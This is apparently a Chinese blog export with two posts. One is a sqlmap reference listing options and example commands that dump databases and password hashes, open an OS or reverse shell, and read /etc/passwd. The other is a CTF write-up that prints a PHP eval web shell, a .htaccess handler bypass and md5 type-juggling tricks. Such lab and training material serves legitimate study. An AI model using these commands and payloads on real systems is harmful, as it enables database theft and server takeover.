<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line">-u URL, –url=URL 目标URL。</span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">-g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line">-c CONFIGFILE 从INI配置文件中加载选项。</span><br></pre></td></tr></table></figure>

<h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h3><p>这些选项可以用来指定如何连接到目标URL。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data=DATA 通过 POST 方法提交的数据字符串--param-del=PDEL 用于分割参数值的字符</span><br><span class="line">--cookie=COOKIE HTTP Cookie 头</span><br><span class="line">--cookie-del=CDEL 用于分割 cookie 值的字符</span><br><span class="line">--load-cookies=L.. 包含 cookies 的 Netscape/wget 格式文件</span><br><span class="line">--drop-set-cookie 忽略响应中的 Set-Cookie 头</span><br><span class="line">--user-agent=AGENT</span><br><span class="line">HTTP User-Agent 头</span><br><span class="line">--random-agent 使用随机选择的 HTTP User-Agent 头</span><br><span class="line">--host=HOST HTTP Host 头</span><br><span class="line">--referer=REFERER HTTP Referer 头</span><br><span class="line">--headers=HEADERS Extra 头(e.g. &quot;Accept-Language: fr\nETag: 123&quot;)</span><br><span class="line">--auth-type=AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)</span><br><span class="line">--auth-cred=AUTH.. HTTP 认证证书(name:password)</span><br><span class="line">--auth-private=A.. HTTP 认证 PEM 私钥文件</span><br><span class="line">--proxy=PROXY 使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO.. 代理认证证书(name:password)</span><br><span class="line">--proxy-file=PRO.. 从文件读取代理列表</span><br><span class="line">--ignore-proxy 接受系统默认代理设置</span><br><span class="line">--tor 使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT 设置默认以外的 Tor 代理端口</span><br><span class="line">--tor-type=TORTYPE 设置 Tor 代理方式(HTTP(默认), SOCKS4 或</span><br><span class="line">SOCKS5)</span><br><span class="line">--check-tor 检查 Tor 是否正确使用--delay=DELAY 每个 HTTP 请求之间延迟的秒数</span><br><span class="line">--timeout=TIMEOUT 认定连接超时的秒数(默认 30)</span><br><span class="line">--retries=RETRIES 超时重试的次数(默认 3)</span><br><span class="line">--randomize=RPARAM 随机改变给定参数的值</span><br><span class="line">--safe-url=SAFURL 设置一个安全链接供系统经常访问</span><br><span class="line">--safe-freq=SAFREQ 设置一个安全连接供系统在两次测试之间访问</span><br><span class="line">--skip-urlencode 不对攻击载荷数据进行 URL 编码</span><br><span class="line">--force-ssl</span><br></pre></td></tr></table></figure>

<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br> 您自己的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all 检索一切</span><br><span class="line">-b, --banner 检索 DBMS banner 信息</span><br><span class="line">--current-user 检索 DBMS 当前用户</span><br><span class="line">--current-db 检索 DBMS 当前数据库</span><br><span class="line">--hostname检索 DBMS 服务器主机名</span><br><span class="line">--is-dba 检测当前用户是否是 DBA</span><br><span class="line">--users枚举 DBMS 用户名</span><br><span class="line">--passwords枚举 DBMS 用户密码哈希</span><br><span class="line">--privileges 枚举 DBMS 用户权限</span><br><span class="line">--roles枚举 DBMS 用户角色</span><br><span class="line">--dbs 枚举 DBMS 数据库</span><br><span class="line">--tables 枚举 DBMS 数据库表--columns 枚举 DBMS 数据库表字段</span><br><span class="line">--schema 枚举 DBMS 架构</span><br><span class="line">--count检索数据表中的条目数</span><br><span class="line">--dump 转储 DBMS 数据库表中的条目</span><br><span class="line">--dump-all 转储所有 DBMS 数据库表中的条目</span><br><span class="line">--search 搜索字段名, 表名和(或)库名</span><br><span class="line">--comments 检索 DBMS 注释</span><br><span class="line">-D DB DBMS 数据库</span><br><span class="line">-T TBL DBMS 数据库表</span><br><span class="line">-C COL DBMS 数据库表字段</span><br><span class="line">-X EXCLUDECOL 不枚举 DBMS 数据库表字段</span><br><span class="line">-U USER DBMS 用户</span><br><span class="line">--exclude-sysdbs 枚举数据库表时排除 DBMS 系统库</span><br><span class="line">--where=DUMPWHERE 转储数据表时使用 WHERE 条件</span><br><span class="line">--start=LIMITSTART 第一个查询的输出项检索</span><br><span class="line">--stop=LIMITSTOP 最后一个查询的输出项检索</span><br><span class="line">--first=FIRSTCHAR 第一个查询的输出字的字符检索</span><br><span class="line">--last=LASTCHAR 最后一个查询的输出字的字符检索</span><br><span class="line">--sql-query=QUERY 要执行的 SQL 语句</span><br><span class="line">--sql-shell返回交互式的 SQL shell</span><br><span class="line">--sql-file=SQLFILE 从给定的文件执行 SQL 语句强制暴破</span><br><span class="line">--common-tables 检查是否存在常见表</span><br><span class="line">--common-columns 检查是否存在常见字段</span><br></pre></td></tr></table></figure>

<h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><p>这些选项可用于优化SqlMap的性能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">–predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">–keep-alive 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">–null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure>

<h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER 测试参数</span><br><span class="line">--skip=SKIP跳过对给定参数的测试</span><br><span class="line">--dbms=DBMS在这里强制指定后端 DBMS--dbms-cred=DBMS.. DBMS 认证证书(user:password)</span><br><span class="line">--os=OS在这里强制后端 DBMS 操作系统</span><br><span class="line">--invalid-bignum 使用大数字无效化值</span><br><span class="line">--invalid-logical 使用逻辑运算无效化值</span><br><span class="line">--invalid-string 使用随机字符串无效化值</span><br><span class="line">--no-cast 关闭攻击载荷铸造机制</span><br><span class="line">--no-escape 关闭字符串逃逸机制</span><br><span class="line">--prefix=PREFIX 注入攻击载荷前缀字符串</span><br><span class="line">--suffix=SUFFIX 注入攻击载荷后缀字符串</span><br><span class="line">--tamper=TAMPER使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure>

<h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=LEVEL 执行测试的等级(1-5, 默认 1)</span><br><span class="line">--risk=RISK 执行测试的风险(0-3, 默认 1)</span><br><span class="line">--string=STRING 查询被评估为 True 时的匹配字符串</span><br><span class="line">--not-string=NOT.. 查询被评估为 False 时的匹配字符串</span><br><span class="line">--regexp=REGEXP 查询被评估为 True 时的正则表达式</span><br><span class="line">--code=CODE 查询被评估为 True 时的 HTTP 代码</span><br><span class="line">--text-only 仅基于文本内容比较网页</span><br><span class="line">--titles 仅基于标题比较网页</span><br></pre></td></tr></table></figure>

<h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><p>这些选项可用于调整具体的SQL注入测试。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=TECH 使用的 SQL 注入技术(默认使用所有技术)--time-sec=TIMESEC DBMS 响应的延迟秒数(默认 5)</span><br><span class="line">--union-cols=UCOLS UNION 查询注入测试字段的范围</span><br><span class="line">--union-char=UCHAR 暴破字段数量使用的字符</span><br><span class="line">--union-from=UFROM UNION 查询注入 FROM 部分使用的数据表</span><br><span class="line">--dns-domain=DNS.. DNS 溢出攻击所使用的域名</span><br><span class="line">--second-order=S.. 二阶响应页面 URL</span><br></pre></td></tr></table></figure>

<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure>

<h3 id="用户定义函数注入："><a href="#用户定义函数注入：" class="headerlink" title="用户定义函数注入："></a>用户定义函数注入：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>

<h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><p>这些选项可以被用来运行蛮力检查。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">–common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>

<p>User-defined function injection（用户自定义函数注入）：<br> 这些选项可以用来创建用户自定义函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–udf-inject 注入用户自定义函数</span><br><span class="line"> –shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>

<h3 id="强制使用-SSL-HTTPS"><a href="#强制使用-SSL-HTTPS" class="headerlink" title="强制使用 SSL&#x2F;HTTPS"></a>强制使用 SSL&#x2F;HTTPS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--hpp 使用 HTTP 参数污染</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE 供提交请求之前评估参数的 Python 代码(e.g.</span><br><span class="line"></span><br><span class="line">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>

<h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–os-cmd=OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">–os-shell 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">–os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">–priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">–msf-path=MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line"></span><br><span class="line">–tmp-path=TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>

<h3 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–reg-read 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">–reg-del 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">–reg-key=REGKEY Windows注册表键</span><br><span class="line"></span><br><span class="line">–reg-value=REGVAL Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-data=REGDATA Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">–reg-type=REGTYPE Windows注册表项值类型</span><br></pre></td></tr></table></figure>

<p>这些选项可以用来设置一些一般的工作参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s SESSIONFILE 从存储(.sqlite)文件中读取会话</span><br><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量为一个文本文件</span><br><span class="line">--batch</span><br><span class="line">从不询问用户输入, 使用默认行为</span><br><span class="line">--charset=CHARSET 强制数据检索使用的字符编码</span><br><span class="line">--crawl=CRAWLDEPTH 从目标 URL 抓取起始网页</span><br><span class="line">--csv-del=CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)</span><br><span class="line">--dump-format=DU.. 转储数据的格式(CSV(默认), 可以设置为 HTML</span><br><span class="line">或 SQLITE)</span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--forms</span><br><span class="line">分析并测试目标 URL 中的表单</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--hex 对数据检索使用 DBMS 的 hex 函数</span><br><span class="line">--output-dir=OUT.. 自定义输出目录路径--parse-errors 从响应中分析并显示 DBMS 错误消息</span><br><span class="line">--pivot-column=P.. 透视字段</span><br><span class="line">--save 保存选项到 INI 配置文件</span><br><span class="line">--scope=SCOPE 用正则表达式从所提供的代理日志过滤目标</span><br><span class="line">--test-filter=TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)</span><br><span class="line">--update 更新 sqlmap</span><br></pre></td></tr></table></figure>

<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">--alert=ALERT 当找到 SQL 注入时运行操作系统命令</span><br><span class="line">--answers=ANSWERS 设置问题的答案(e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line">--beep 当找到 SQL 注入时发出蜂鸣</span><br><span class="line">--check-waf 启发式检查 WAF/IPS/IDS 保护</span><br><span class="line">--cleanup 从 sqlmap 具体 UDF 和表清理 DBMS</span><br><span class="line">--dependencies 检查是否缺少(非核心)的 sqlmap 的依赖</span><br><span class="line">--disable-coloring 禁用控制台输出着色</span><br><span class="line">--gpage=GOOGLEPAGE 从指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf 使测试通过 WAF/IPS/IDS 保护</span><br><span class="line">--mobile 通过 HTTP User-Agent 头模拟智能手机</span><br><span class="line">--page-rank 为 Google dork 结果显示网页排名(PR)</span><br><span class="line">–forms 对目标URL的解析和测试形式</span><br><span class="line">–parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">–replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line">–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">--purge-output 从输出目录中安全删除所有内容</span><br><span class="line">--smart 仅通过积极的启发式进行测试</span><br><span class="line">--wizard 用于初级用户的简单向导接口</span><br></pre></td></tr></table></figure>

<h3 id="SQLMAP基础信息"><a href="#SQLMAP基础信息" class="headerlink" title="SQLMAP基础信息"></a>SQLMAP基础信息</h3><p> <strong>获取当前用户名称</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-user</span><br></pre></td></tr></table></figure>

<p><strong>获取当前数据库名称</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>

<p><strong>获取表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security --tables</span><br></pre></td></tr></table></figure>

<p><strong>获取字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure>

<p><strong>获取字段内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users -C id --dump</span><br></pre></td></tr></table></figure>

<h3 id="SQLMAP进阶信息内容"><a href="#SQLMAP进阶信息内容" class="headerlink" title="SQLMAP进阶信息内容"></a>SQLMAP进阶信息内容</h3><p><strong>执行测试等级</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>

<p><strong>指定数据库类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbms &quot;Mysql&quot;</span><br></pre></td></tr></table></figure>

<p><strong>列数据库用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --users</span><br></pre></td></tr></table></figure>

<p><strong>列数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p><strong>数据库用户密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords</span><br></pre></td></tr></table></figure>

<p><strong>列出指定用户数据库密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords -U root</span><br></pre></td></tr></table></figure>

<p><strong>查看权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges</span><br></pre></td></tr></table></figure>

<p><strong>查看指定用户权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges -U root</span><br></pre></td></tr></table></figure>

<p><strong>是否是数据库管理员</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure>

<p><strong>枚举数据库用户角色</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --roles</span><br></pre></td></tr></table></figure>

<p><strong>导入用户自定义函数（获取系统权限！）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --udf-inject</span><br></pre></td></tr></table></figure>

<p><strong>cookie注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --cookie &quot;COOKIE_VALUE&quot;</span><br></pre></td></tr></table></figure>

<p><strong>获取banner信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -b</span><br></pre></td></tr></table></figure>

<p><strong>post注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot; --data &quot;id=3&quot;</span><br></pre></td></tr></table></figure>

<p><strong>指纹判别数据库类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -f</span><br></pre></td></tr></table></figure>

<p><strong>代理注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;  --proxy&quot;http://127.0.0.1:8118&quot;</span><br></pre></td></tr></table></figure>

<p><strong>指定关键词</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</span><br></pre></td></tr></table></figure>

<p><strong>执行系统命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --file /etc/passwd</span><br></pre></td></tr></table></figure>

<p><strong>统交互shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-shell</span><br></pre></td></tr></table></figure>

<p><strong>反弹shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-pwn</span><br></pre></td></tr></table></figure>

<p><strong>读取win系统注册表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --reg-read</span><br></pre></td></tr></table></figure>

<p><strong>保存进度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs-o &quot;sqlmap.log&quot;</span><br></pre></td></tr></table></figure>

<p><strong>恢复已保存进度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs  -o &quot;sqlmap.log&quot; --resume</span><br></pre></td></tr></table></figure>

<p>3.SQLMAP绕过WAF</p>
<p>4.SQLMAP提权</p>
]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf</title>
    <url>/2023/08/08/buuctf/</url>
    <content><![CDATA[<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><span id="more"></span>

<p>1、后缀名不能有ph！对于文件后缀名的限制，无法绕过这里<br>2、上传类型也太露骨了吧！对Content-Type的限制，修改为image&#x2F;jpeg即可绕过<br>3、诶，别蒙我啊，这标志明显还是php啊</p>
<p>对上传文件的内容进行了检测，不能含有&lt;?，这里的PHP版本为：PHP&#x2F;5.6.23，可以使用 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;111&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是搭建到蚁剑上连接不成功</p>
<p>上传一个.htaccess文件将别的后缀名文件内容解析为php程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .mochu</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165204744.png" alt="image-20230805165204744"></p>
<p>然后上传shell即可</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165102425.png" alt="image-20230805165102425"></p>
<p>用蚁剑创建数据</p>
<p>找到根目录下的flag</p>
<p>![屏幕截图 2023-08-05 150602](D:\Users\陈\Pictures\Screenshots\屏幕截图 2023-08-05 150602.png)</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开靶机是一串代码<br>因为html 渲染过程中是不会把\n当做回车展示的，所以右键查看源代码，瞬间舒服了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>按行显示的题目代码“代码审计”<br>读代码可知拿到flag只需要满足俩条件：<br>1.让以get方式传参的两个变量gg和id满足md5后的值强比较相等，本身的值弱比较不相等<br>2.以post方式传参的变量password不是数字并且与数字1234567弱比较相等<br>由此，在url后追加?id[]&#x3D;1&amp;gg[]&#x3D;2就可以显示“You got the first step”的提示。但passwd参数还没有传，此时需要借助浏览器插件HackBar以post方式传入passwd&#x3D;1234567a<br>以get方式传参并使md5值相等<br>总结：<br>1.给数组类型的变量赋值不同的数值，可以满足变量的md5值在进行强比较时相等，又满足他们自身的值在进行弱比较时不相等。<br>2.在数字后面加个字母，就不再是数字但又可以满足和数字做弱比较时相等。</p>
<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题目的名字一看就能猜到应该是文件上传了<br>打开靶机链接是这个样子的，我不知道这是什么梗<br>题目网页<br>因为类似的题上一篇已经写过了，这里就简写。这道题也是只能上传非php后缀的文件，然后再上传.htaccess文件，使服务器端将jpg看做php。<br>上传jpg格式的一句话木马：<br>一句话木马</p>
<p>上传.htaccess时拦截包，修改文件类型为image&#x2F;jpeg：<br>上传.htaccess文件<br>.htaccess里写的内容：SetHandler application&#x2F;x-httpd-php</p>
<p>上传1.jpg和.htaccess成功后，就可以用中国蚁剑连接了<br>url地址是：靶机的url&#x2F;upload&#x2F;随机生成的一串数&#x2F;1.jpg（即一句话木马文件上传到的路径）<br>密码是写在1.jpg里的111<br>测试连接，显示连接成功，点击添加，在服务器端的根目录可以找到flag</p>
<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title="htaccess是什么"></a>htaccess是什么</h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config</p>
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>访问url</p>
<p>重命名+堆叠注入</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>输入1’发现不回显</p>
<p>输入1’#显示正常</p>
<p>应该是存在sql注入了</p>
